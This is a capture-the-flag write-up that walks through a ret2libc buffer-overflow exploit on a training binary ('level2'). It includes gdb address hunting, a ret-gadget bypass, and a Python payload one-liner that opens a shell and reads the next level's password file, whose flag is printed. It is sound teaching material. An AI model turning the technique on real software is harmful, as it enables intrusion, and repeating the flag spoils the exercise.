## Return of the libc (level2)

As in the last level, this [binary](level2/source.c) uses gets, which allows us
to rewrite the return address of the function where it is called and to move the
instruction pointer where we want. The main difference here is that there is no
function calling a shell in the binary, so we will have to do it ourself.

For this we will execute an exploit called
[ret2libc](https://bufferoverflows.net/ret2libc-exploitation-example/), which
will simply make us return inside a libc function. To launch a shell all we have
to do is to get the [system](https://linux.die.net/man/3/system) function's
address and pass a command string like `/bin/sh` to it. We will also use exit as
system's own return address so that the exploit exits cleanly.

### step 1: Get the addresses

```shell
# run gdb on the binary
gdb ./level2
# break on main
(gdb) b main
Breakpoint 1 at 0x8048542
(gdb) run
Starting program: /home/user/level2/level2

Breakpoint 1, 0x08048542 in main ()
# get system's address
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
```

Now that we have our two function addresses, all we need left is an address
pointing to a shell string. To do that we are going to include the said string
at the begining of our payload and use strdup's returned value as the command
argument for system.

```shell
# break in the p function
(gdb) b e
Breakpoint 2 at 0x80484da
(gdb) c
Continuing.

Breakpoint 2, 0x080484da in p ()
# disassemble the function
(gdb) disass
... # removed some lines for brevity
   0x08048534 <+97>:    mov    %eax,(%esp)
   0x08048538 <+100>:   call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:   leave
   0x0804853e <+106>:   ret
...
# break on the instruction after the strdup call
(gdb) b *0x0804853d
Breakpoint 3 at 0x804853d
(gdb) c
Continuing.
# now we reach the gets call so input the command string
/bin/sh
/bin/sh # the puts call which gives us back what we entered

Breakpoint 3, 0x0804853d in p ()
# now that we passed the strdup call, see the return value
(gdb) p (char *)$eax
$4 = 0x804a008 "/bin/sh"
```

### step 2: Build the payload

| command string (8) | padding (72) | system (4) | exit (4)   | strdup return (4) |
|--------------------|--------------|------------|------------|-------------------|
| "/bin/sh"          | 0x909090...  | 0xb7e6b060 | 0xb7e5ebe0 | 0x804a008         |

> The padding is made of 0x90 bytes which are noop instructions. This is not
> really necessary since this part of the memory is not gonna be executed but
> this is an "exploit good practice" I guess. Also, the addresses contained
> in the payload will need to be reversed because the rainfall system is little
> endian.

We place the command string first so that it gets copied by the strdup call. It
is eight bytes long because it ends with a null byte. Then we add 72 bytes of
padding. The buffer to overflow is 76 bytes long and since the return address of
the function _p_ is at $ebp + 4, we need to add 4 bytes to start overwriting it.
After that we can place system's address where we will go once _p_ returns. The
exit address will be the return address of the system call and finally we can
pass the argument of system which is the result of the strdup call.

This would work in "normal" circumstances. But here, the binary checks that
_p_'s return address does not start with 0xb, which is the case here with
system's address. This broadly excludes any stack address or library functions.
The trick to remedy this is to use the ret instruction of the _p_ function
itself. As shown above, its address is _0x0804853e_, which passes the stack
test. We just have to insert it before the system address in the payload.

So instead of the p's ret instruction directly poping the system's address and
loading it into _eip_ (the instruction pointer), it will loop on itself once
before eventually doing so. However, the overall logic remains the same:

| command string (8) | padding (72) | ret        |system (4)  | exit (4)   | strdup return (4) |
|--------------------|--------------|------------|------------|------------|-------------------|
| "/bin/sh"          | 0x909090...  | 0x0804853e | 0xb7e6b060 | 0xb7e5ebe0 | 0x804a008         |

```shell
# finally feed the complete payload to the binary
(python -c 'print "/bin/sh\x00" + "\x90" * 72 + "\x08\x04\x85\x3e"[::-1] + "\xb7\xe6\xb0\x60"[::-1] + "\xb7\xe5\xeb\xe0"[::-1] + "\x08\x04\xa0\x08"[::-1]'; cat) | ./level2
/bin/sh
# the shell is yours
whoami
level3
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```
